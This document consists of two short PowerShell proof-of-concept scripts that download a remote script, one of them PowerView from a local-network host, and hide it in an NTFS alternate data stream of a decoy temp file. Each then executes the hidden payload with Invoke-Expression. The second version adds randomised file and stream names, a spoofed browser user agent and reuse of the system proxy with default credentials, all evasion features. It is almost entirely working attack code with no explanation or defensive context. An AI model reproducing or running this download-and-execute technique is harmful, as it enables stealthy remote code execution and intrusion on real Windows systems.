$file = "$env:TEMP\test.txt"
Set-Content -Path $file -Value 'Alternate Data Stream Test File'
Get-Content -Path $file
Alternate Data Stream Test File

$pvfile = Invoke-WebRequest -Uri http://192.168.0.105:8000/powerview.ps1
Add-Content -Encoding Byte -Path $file -Value $pvfile.Content -Stream 'powerview'
Invoke-Expression (Get-Content -Path $file -Stream 'powerview' -Raw)





Another POC

  $randomfilename = -join ((65..90) + (97..122) |
    Get-Random -Count 14 |
    ForEach-Object -Process {
      [char]$_
  })

  $ads = -join ((65..90) + (97..122) |
    Get-Random -Count 8 |
    ForEach-Object -Process {
      [char]$_
  })

  $file = "$env:TEMP\$randomfilename" + '.txt'
  #$ads = 'evil'
  #$uri = 'http://192.168.0.105:8000/powerview.ps1'
  $uri = Read-Host -Prompt 'Please Enter the url to the file: '
  Set-Content -Path $file -Value 'Alternate Data Stream Test File'
  #Get-Content -Path $file

  $ua = 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-GB)'
  $IESettings = Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings'
  if ($IESettings.ProxyEnable -eq 1)
  {
    $Proxy = "http://$(($IESettings.ProxyServer.Split(';') | Where-Object -FilterScript {$_ -match 'ttp='
    
    }) -replace '.*=')"
    $request = Invoke-WebRequest -Uri $uri -UserAgent $ua -ProxyUseDefaultCredentials -Proxy $Proxy -UseBasicParsing
  }
  else 
  {
    $request = Invoke-WebRequest -Uri $uri -UserAgent $ua -UseBasicParsing
  }

  Add-Content -Encoding Byte -Path $file -Value $request.Content -Stream $ads
  $adspayload = Get-Content -Path $file -Stream $ads -Raw
  Invoke-Expression $adspayload